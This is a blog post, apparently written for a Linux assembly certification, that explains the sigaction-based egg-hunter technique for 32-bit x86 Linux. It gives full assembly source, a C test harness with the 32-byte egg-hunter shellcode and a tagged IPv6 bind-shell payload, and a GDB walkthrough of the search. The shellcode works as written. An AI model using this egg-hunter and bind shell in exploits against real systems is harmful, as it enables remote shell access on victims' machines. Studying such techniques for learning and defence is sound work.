---
layout: post
title: SHELLCODE_EGG_HUNTER – LINUX/X86
---
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification
* Student ID: SLAE-1233
* Assignment: 3
* Github: [Kartik Durg](https://github.com/kartikdurg)

___

#### WHAT IS AN EGG-HUNTER?
The “Egg-Hunter” is a technique used to search for an unique “tag” that was prefixed with the large shellcode and start the execution of shellcode once found.

#### WHY DO WE NEED EGG-HUNTER?
For example, let us assume that you have found a buffer-overflow vulnerability and there is no enough memory space for our bind/reverse shellcode. To solve this problem a unique “tag” is prefixed with our shellcode and then execute “Egg Hunter” shellcode  that is small in size, fast and robust at the same time, this “Egg-Hunter” will search our unique “tag” and starts the execution of large shellcode(bind/reverse) once found.

In this post I will be implementing the “sigaction(2)” approach as discussed by Skape in the [Safely Searching Process Virtual Address Space](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) research paper.

The “sigaction(2)” prototype is as follows:
```
int sigaction(int signum, const struct sigaction *act, struct sigaction *oldact);
```

The EAX register should hold the system call number of “sigaction” as defined below:
```
#define __NR_sigaction 67 [0x43]
```

The goal here is to use the structure of act being in the ECX register for validating the region of memory.

Now let’s jump into the implementation which is as follows:
```
global _start
section .text

_start:
xor ecx, ecx             ;zero out ecx

page_allign: 
xor cx, 0x0fff           ;Page allignment

valid_add: 
inc ecx                  ;increment the pointer to try next valid address
push 0x43                ;push syscall 67 | sigaction
pop eax                  ;EAX=0x43
int 0x80                 ;call sigaction() for validation

efault_cmpsn:
cmp al, 0xf2             ;Low-byte of EAX compared against 0xf2|EFAULT
jz page_allign           ;If ZF set JMP back to "page_allign"

search_tag:
mov eax, 0x4a424f59      ;move the "tag" to EAX register| 0x4a424f59 = JBOY
mov edi, ecx             ;move ECX to EDI
scasd                    ;Compare contents of EDI to the dword value in EAX and increment
jnz valid_add            ;Not equal? then go back to valid_add
scasd                    ;Compare contents of EDI to the dword value in EAX and increment
jnz valid_add            ;Not equal? then go back to valid_add
jmp edi                  ;TAG found ==> Execute the shellcode I'm pointing to
```

To understand this concept, let’s analyze the complete shellcode below:

```
#include <stdio.h> 
#include <string.h> 

#define JBOY "\x59\x4f\x42\x4a"

//Egg-Hunter shellcode
unsigned char egg_hunter[] = "\x31\xc9\x66\x81\xf1\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x59\x4f\x42\x4a\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";

//Bind shell(IPv6)
unsigned char egg[] = JBOY JBOY
"\x6a\x66\x58\x31\xdb\x6a\x06\x6a\x01\x6a\x0a\x43\x89\xe1\xcd\x80\x96\x31\xc0\x50\x50\x50\x50\x50\x66\x68\x11\x5c\x66\x6a\x0a\x89\xe1\x6a\x1c\x51\x56\x89\xe1\x43\x6a\x66\x58\xcd\x80\x53\x56\x89\xe1\x43\x43\x6a\x66\x58\xcd\x80\x99\x52\x52\x56\x89\xe1\x43\x6a\x66\x58\xcd\x80\x93\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x31\xc9\x51\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

int main() 
{ 
printf("Egg is at %p\n", egg); 
printf("Egghunter size: %d\n", strlen(egg_hunter)); 
int (*ret)() = (int(*)())egg_hunter; 
ret(); 
}
```

The above shellcode will execute bind shell once the “tag”(JBOY) is identified by our egg-hunter shellcode.

Let’s run the shellcode using GDB and setup a break point at “main” and “egg_hunter”:

![](/media/3-egg-hunter-1.jpg)

Now that we have reached the breakpoint which points to our “Egg-Hunter” shellcode, let us also define a “hook-stop” to examine EAX, ECX and EDI registers every time the execution stops.

![](/media/3-egg-hunter-2.jpg)

After the first XOR instruction, the next two instruction performs page alignment operation by XORing “0xfff” on lower 16-bits of ECX and then incrementing ECX by one.  As noticed in the screenshot below, this operation is equivalent to adding “0x1000” to ECX register.

![](/media/3-egg-hunter-3.jpg)

After the page alignment operation, the lower 16-bit of EAX register is initialized to 0x43[67] which is a system call number of “sigaction” and once the system call is executed it’s return value is then compared with 0xf2 which represents the lower byte of EFAULT. If the lower byte of EAX is equal to 0xf2 the implementation again jumps back to XOR “0xfff” on lower 16-bits of ECX as seen below:

![](/media/3-egg-hunter-4.jpg)

Implementation when lower byte of EAX is “not-equal” to 0xf2:

![](/media/3-egg-hunter-5.jpg)

The value of valid pointer is stored in EDI register after moving the “tag” to EAX register. Next, the scasd instruction compares the contents of memory stored in EDI to the DWORD value in EAX(unique tag).

Instead of stepping through each and every instruction let’s setup a breakpoint on second scasd instruction and continue the execution.

![](/media/3-egg-hunter-6.jpg)

Now that the scasd instruction has been executed twice, the value of EDI will be 8-bytes apart pointing at our shellcode(bind/reverse or any other) as seen below:

![](/media/3-egg-hunter-7.jpg)

Execution of large payload (bind shell):

![](/media/3-egg-hunter-8.jpg)

___

### PROOF OF CONCEPT:

![](/media/3-egg-hunter-9.jpg)

The size of “Egg-hunter” shellcode is just 32-bytes when compared to the original size of  bind shell which is 100-bytes, thus allowing us to execute larger payload when the available memory space is less than payload.

___

Link to shellcode.c: [egg_hunter.c](https://github.com/kartikdurg/SLAE/blob/master/Assignment_0x3/egg_hunter.c)

Link to shellcode.asm: [egg_hunter.asm](https://github.com/kartikdurg/SLAE/blob/master/Assignment_0x3/egg_hunter.asm)

Thank you for reading 🙂

– Kartik Durg